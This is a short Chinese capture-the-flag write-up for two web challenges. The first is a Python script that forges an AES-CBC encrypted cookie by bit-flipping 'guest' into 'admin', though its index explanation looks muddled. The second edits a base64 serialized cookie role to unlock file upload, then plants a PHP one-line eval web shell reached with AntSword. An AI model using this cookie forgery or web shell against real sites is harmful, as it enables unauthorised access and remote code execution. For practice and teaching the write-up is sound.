# **WEB**

## checkin（whocansee）

 分析源码得知cookie是用AES与CBC分组模式加密的，由于key未知不能直接用题给源码改明文后加密，故利用xor的性质写出解密脚本。

from Crypto.Cipher import AES /**/此处报错则检查是否安装Crypto库，是否把装好的Crypto文件夹名称首字母大写**
import binascii
import base64
import json
ciphertext = "originalcookie"
ciphertext = base64.b64decode(ciphertext)
ciphertext = list(ciphertext)
ciphertext[n] = ciphertext[n]^ ord('g') ^ ord('a')
ciphertext[n+1] = ciphertext[n+1]^ ord('u') ^ ord('d')
ciphertext[n+2] = ciphertext[n+2]^ ord('e') ^ ord('m')
ciphertext[n+3] = ciphertext[n+3]^ ord('s') ^ ord('i')
ciphertext[n+4] = ciphertext[n+4]^ ord('t') ^ ord('n')
print(base64.b64encode(bytes(ciphertext)))

n的值为想要修改的字符（此处是g,u,e,s,t）在明文字符串中的位置，这里是按照1开始计算的，比如g是第十一个，n就为11. 实际的操作是**修改后的字符** = **修改前的字符** 和 **它前一个修改前的字符**xor运算 再和 **它前一个修改后的字符**做xor运算。

## **include（whocansee）**

用BrupSuite抓包，给cookie进行base64解码，直接能看到明文，修改明文最后那个s:7:tourist为s:5:Lteam后再给编码回去，修改原cookie，获得上传权限，传个一句话木马上去   <?php @eval($_POST['flag']);?> 发现连路径都给了，于是直接拿Antsword连接，在根目录拿到flag。

